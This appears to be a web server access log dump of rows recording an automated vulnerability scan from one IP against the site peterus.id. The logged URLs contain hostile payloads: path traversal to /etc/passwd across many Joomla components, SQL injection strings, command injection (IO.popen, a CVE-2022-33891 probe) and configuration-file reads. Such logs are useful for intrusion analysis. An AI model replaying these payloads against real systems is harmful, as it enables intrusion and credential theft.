(793, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_webtv', '2025-06-28 00:07:12', '2025-06-28 00:07:12'),
(794, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0', 'https://www.peterus.id/?filename=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&mphb_action=download', '2025-06-28 00:07:56', '2025-06-28 00:07:56'),
(795, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15', 'https://peterus.id/index.php?item_id=1&list%5Bordering%5D=&list%5Bselect%5D=updatexml%280x23%2Cconcat%281%2Cmd5%28999999999%29%29%2C1%29&option=com_contenthistory&type_id=1&view=history', '2025-06-28 00:14:09', '2025-06-28 00:14:09'),
(796, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36', 'https://peterus.id/?IO.popen%28%27cat%20%2Fetc%2Fpasswd%27%29.read%0A%23=', '2025-06-28 00:15:12', '2025-06-28 00:15:12'),
(797, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0', 'https://www.peterus.id/index.php?item_id=1&list%5Bordering%5D=&list%5Bselect%5D=updatexml%280x23%2Cconcat%281%2Cmd5%28999999999%29%29%2C1%29&option=com_contenthistory&type_id=1&view=history', '2025-06-28 00:15:56', '2025-06-28 00:15:56'),
(798, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299', 'https://peterus.id/?PagePrincipale%2Frss=&id=1%27%20and%20extractvalue%280x0a%2Cconcat%280x0a%2C%28select%20concat_ws%280x207c20%2Cmd5%28999999999%29%2C1%2Cuser%28%29%29%29%29%29--%20-', '2025-06-28 00:16:34', '2025-06-28 00:16:34'),
(799, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id/?IO.popen%28%27cat%20%2Fetc%2Fpasswd%27%29.read%0A%23=', '2025-06-28 00:17:01', '2025-06-28 00:17:01'),
(800, '156.246.17.42', 'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id/?PagePrincipale%2Frss=&id=1%27%20and%20extractvalue%280x0a%2Cconcat%280x0a%2C%28select%20concat_ws%280x207c20%2Cmd5%28999999999%29%2C1%2Cuser%28%29%29%29%29%29--%20-', '2025-06-28 00:18:17', '2025-06-28 00:18:17'),
(801, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id/index.php?s=%2Finstall%2Findex%2Findex', '2025-06-28 00:18:55', '2025-06-28 00:18:55'),
(802, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15', 'https://www.peterus.id/index.php?s=%2Finstall%2Findex%2Findex', '2025-06-28 00:20:41', '2025-06-28 00:20:41'),
(803, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_lovefactory', '2025-06-28 00:21:56', '2025-06-28 00:21:56'),
(804, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id/index.php?id=-1%20UNION%20SELECT%201%2Cmd5%28999999999%29%2C3%2C4%2C5%2C6%2C7%2C8--&option=com_departments', '2025-06-28 00:23:11', '2025-06-28 00:23:11'),
(805, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_lovefactory', '2025-06-28 00:23:45', '2025-06-28 00:23:45'),
(806, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?id=-1%20UNION%20SELECT%201%2Cmd5%28999999999%29%2C3%2C4%2C5%2C6%2C7%2C8--&option=com_departments', '2025-06-28 00:24:56', '2025-06-28 00:24:56'),
(807, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id/index.php?goods_id=1%20and%20updatexml%281%2Cconcat%280x7e%2Cmd5%28999999999%29%2C0x7e%29%2C1%29&s=api%2Fgoods_detail', '2025-06-28 00:30:12', '2025-06-28 00:30:12'),
(808, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id/index.php?id=1&option=com_prayercenter&sessionid=1%27%20AND%20EXTRACTVALUE%2822%2CCONCAT%280x7e%2Cmd5%28849820317%29%29%29--%20X&task=confirm', '2025-06-28 00:30:20', '2025-06-28 00:30:20'),
(809, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?goods_id=1%20and%20updatexml%281%2Cconcat%280x7e%2Cmd5%28999999999%29%2C0x7e%29%2C1%29&s=api%2Fgoods_detail', '2025-06-28 00:32:00', '2025-06-28 00:32:00'),
(810, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0 Safari/537.36', 'https://www.peterus.id/index.php?id=1&option=com_prayercenter&sessionid=1%27%20AND%20EXTRACTVALUE%2822%2CCONCAT%280x7e%2Cmd5%28849820317%29%29%29--%20X&task=confirm', '2025-06-28 00:32:05', '2025-06-28 00:32:05'),
(811, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_matamko', '2025-06-28 00:34:07', '2025-06-28 00:34:07'),
(812, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_matamko', '2025-06-28 00:35:56', '2025-06-28 00:35:56'),
(813, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id/index.php?download_file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_jtagmembersdirectory&task=attachment', '2025-06-28 00:36:57', '2025-06-28 00:36:57'),
(814, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5.1 Safari/605.1.15', 'https://peterus.id', '2025-06-28 00:37:40', '2025-06-28 00:37:40'),
(815, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0', 'https://www.peterus.id/index.php?download_file=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&option=com_jtagmembersdirectory&task=attachment', '2025-06-28 00:38:40', '2025-06-28 00:38:40'),
(816, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://peterus.id/?id=GbQqlk%25%7B128%2A128%7D', '2025-06-28 00:38:41', '2025-06-28 00:38:41'),
(817, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-28 00:39:20', '2025-06-28 00:39:20'),
(818, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://www.peterus.id/?id=GbQqlk%25%7B128%2A128%7D', '2025-06-28 00:40:22', '2025-06-28 00:40:22'),
(819, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0', 'https://peterus.id/index.php?folder=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&g=element&method=onAjax_files&option=com_fabrik&plugin=image&task=plugin.pluginAjax', '2025-06-28 00:42:50', '2025-06-28 00:42:50'),
(820, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_bfsurvey', '2025-06-28 00:43:07', '2025-06-28 00:43:07'),
(821, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?folder=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&g=element&method=onAjax_files&option=com_fabrik&plugin=image&task=plugin.pluginAjax', '2025-06-28 00:44:33', '2025-06-28 00:44:33'),
(822, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6.1 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_bfsurvey', '2025-06-28 00:44:48', '2025-06-28 00:44:48'),
(823, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/107.0 Safari/537.36', 'https://peterus.id/index.php?module=Install&view=Index', '2025-06-28 00:47:18', '2025-06-28 00:47:18'),
(824, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240', 'https://www.peterus.id/index.php?module=Install&view=Index', '2025-06-28 00:49:02', '2025-06-28 00:49:02'),
(825, '156.246.17.42', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_gcalendar', '2025-06-28 00:54:23', '2025-06-28 00:54:23'),
(826, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/125.0 Safari/537.36', 'https://peterus.id', '2025-06-28 00:54:27', '2025-06-28 00:54:27'),
(827, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:131.0) Gecko/20100101 Firefox/131.0', 'https://peterus.id/index.php?file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA%3D&option=com_easyshop&task=ajax.loadImage', '2025-06-28 00:55:27', '2025-06-28 00:55:27'),
(828, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-28 00:56:11', '2025-06-28 00:56:11'),
(829, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_gcalendar', '2025-06-28 00:56:12', '2025-06-28 00:56:12'),
(830, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0.1 Safari/605.1.15', 'https://www.peterus.id/index.php?file=Li4vLi4vY29uZmlndXJhdGlvbi5waHA%3D&option=com_easyshop&task=ajax.loadImage', '2025-06-28 00:57:14', '2025-06-28 00:57:14'),
(831, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_gadgetfactory', '2025-06-28 01:00:56', '2025-06-28 01:00:56'),
(832, '156.246.17.42', 'Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_beeheard', '2025-06-28 01:02:01', '2025-06-28 01:02:01'),
(833, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_gadgetfactory', '2025-06-28 01:02:42', '2025-06-28 01:02:42'),
(834, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_beeheard', '2025-06-28 01:03:52', '2025-06-28 01:03:52'),
(835, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-28 01:04:06', '2025-06-28 01:04:06'),
(836, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:129.0) Gecko/20100101 Firefox/129.0', 'https://peterus.id/index.php?q=file%3A%2F%2F%2Fetc%2Fpasswd', '2025-06-28 01:04:07', '2025-06-28 01:04:07'),
(837, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/128.0 Safari/537.36', 'https://peterus.id', '2025-06-28 01:05:10', '2025-06-28 01:05:10'),
(838, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0', 'https://www.peterus.id', '2025-06-28 01:05:52', '2025-06-28 01:05:52'),
(839, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id/index.php?q=file%3A%2F%2F%2Fetc%2Fpasswd', '2025-06-28 01:05:53', '2025-06-28 01:05:53'),
(840, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Mobile/15E148 Safari/604.1', 'https://peterus.id/index.php?ids%5B0%2Cupdatexml%280%2Cconcat%280xa%2Cuser%28%29%29%2C0%29%5D=1', '2025-06-28 01:06:38', '2025-06-28 01:06:38'),
(841, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?ids%5B0%2Cupdatexml%280%2Cconcat%280xa%2Cuser%28%29%29%2C0%29%5D=1', '2025-06-28 01:08:19', '2025-06-28 01:08:19'),
(842, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0', 'https://www.peterus.id', '2025-06-28 01:08:33', '2025-06-28 01:08:33'),
(843, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_joomlaflickr', '2025-06-28 01:08:34', '2025-06-28 01:08:34'),
(844, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_joomlaflickr', '2025-06-28 01:10:19', '2025-06-28 01:10:19'),
(845, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id/?doAs=%60echo%20CVE-2022-33891%20%7C%20rev%60', '2025-06-28 01:13:02', '2025-06-28 01:13:02'),
(846, '156.246.17.42', 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4', 'https://peterus.id/index.php?controller=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jstore', '2025-06-28 01:14:41', '2025-06-28 01:14:41'),
(847, '156.246.17.42', 'WMS/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36', 'https://www.peterus.id/?doAs=%60echo%20CVE-2022-33891%20%7C%20rev%60', '2025-06-28 01:14:49', '2025-06-28 01:14:49'),
(848, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://www.peterus.id/index.php?controller=.%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jstore', '2025-06-28 01:16:27', '2025-06-28 01:16:27'),
(849, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://peterus.id/index.php?layout=modal&list%5Bfullordering%5D=updatexml%280x23%2Cconcat%281%2Cmd5%28999999999%29%29%2C1%29&option=com_fields&view=fields', '2025-06-28 01:18:12', '2025-06-28 01:18:12'),
(850, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id/index.php?layout=modal&list%5Bfullordering%5D=updatexml%280x23%2Cconcat%281%2Cmd5%28999999999%29%29%2C1%29&option=com_fields&view=fields', '2025-06-28 01:19:49', '2025-06-28 01:19:49'),
(851, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_horoscope', '2025-06-28 01:20:48', '2025-06-28 01:20:48'),
(852, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_travelbook', '2025-06-28 01:21:05', '2025-06-28 01:21:05'),
(853, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_if_surfalert', '2025-06-28 01:21:52', '2025-06-28 01:21:52'),
(854, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/100.0 Safari/537.36', 'https://peterus.id/?q=20%29%20%3D%201%20OR%20%28select%20utl_inaddr.get_host_name%28%28SELECT%20version%20FROM%20v%24instance%29%29%20from%20dual%29%20is%20null%20%20OR%20%281%2B1', '2025-06-28 01:22:14', '2025-06-28 01:22:14'),
(855, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_horoscope', '2025-06-28 01:22:38', '2025-06-28 01:22:38'),
(856, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_travelbook', '2025-06-28 01:22:52', '2025-06-28 01:22:52'),
(857, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://peterus.id/index.php?file=%2Fetc%2Fpasswd&op=fileviewer', '2025-06-28 01:22:55', '2025-06-28 01:22:55'),
(858, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_if_surfalert', '2025-06-28 01:23:32', '2025-06-28 01:23:32'),
(859, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id/?q=20%29%20%3D%201%20OR%20%28select%20utl_inaddr.get_host_name%28%28SELECT%20version%20FROM%20v%24instance%29%29%20from%20dual%29%20is%20null%20%20OR%20%281%2B1', '2025-06-28 01:23:51', '2025-06-28 01:23:51'),
(860, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0', 'https://www.peterus.id/index.php?file=%2Fetc%2Fpasswd&op=fileviewer', '2025-06-28 01:24:31', '2025-06-28 01:24:31'),
(861, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://peterus.id/index.php?Itemid=128&option=com_album&target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-28 01:26:08', '2025-06-28 01:26:08'),
(862, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://www.peterus.id/index.php?Itemid=128&option=com_album&target=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '2025-06-28 01:27:58', '2025-06-28 01:27:58'),
(863, '156.246.17.42', 'Mozilla/5.0 (SS; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://peterus.id/index.php?q=category&search=Banking%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2Cmd5%28999999999%29%2C15%2C16%2C17%2C18%2C19--%20', '2025-06-28 01:34:18', '2025-06-28 01:34:18'),
(864, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://www.peterus.id/index.php?q=category&search=Banking%27%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2Cmd5%28999999999%29%2C15%2C16%2C17%2C18%2C19--%20', '2025-06-28 01:36:04', '2025-06-28 01:36:04'),
(865, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15', 'https://peterus.id/index.php?%2Finstaller=', '2025-06-28 01:36:15', '2025-06-28 01:36:15'),
(866, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-28 01:36:50', '2025-06-28 01:36:50'),
(867, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?%2Finstaller=', '2025-06-28 01:38:04', '2025-06-28 01:38:04'),
(868, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Safari/605.1.1', 'https://peterus.id/index.php?page=install', '2025-06-28 01:38:50', '2025-06-28 01:38:50'),
(869, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id/?act=execsql&case=crossall&sql=WY8gzSfZwW9R5YvyK', '2025-06-28 01:38:59', '2025-06-28 01:38:59'),
(870, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-28 01:40:22', '2025-06-28 01:40:22'),
(871, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Avira/134.0.0.0', 'https://www.peterus.id/index.php?page=install', '2025-06-28 01:40:37', '2025-06-28 01:40:37'),
(872, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', 'https://www.peterus.id/?act=execsql&case=crossall&sql=WY8gzSfZwW9R5YvyK', '2025-06-28 01:40:45', '2025-06-28 01:40:45'),
(873, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchacategoriestree', '2025-06-28 01:45:43', '2025-06-28 01:45:43'),
(874, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_perchacategoriestree', '2025-06-28 01:47:29', '2025-06-28 01:47:29'),
(875, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15', 'https://peterus.id/index.php?id=..%2F..%2FConf%2Fconfig.php&s=Admin-Data-down', '2025-06-28 01:52:48', '2025-06-28 01:52:48'),
(876, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jwhmcs', '2025-06-28 01:53:20', '2025-06-28 01:53:20'),
(877, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Safari/605.1.15', 'https://peterus.id/index.php?controller=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&option=com_jradio', '2025-06-28 01:53:31', '2025-06-28 01:53:31'),
(878, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id/index.php?id=..%2F..%2FConf%2Fconfig.php&s=Admin-Data-down', '2025-06-28 01:54:37', '2025-06-28 01:54:37'),
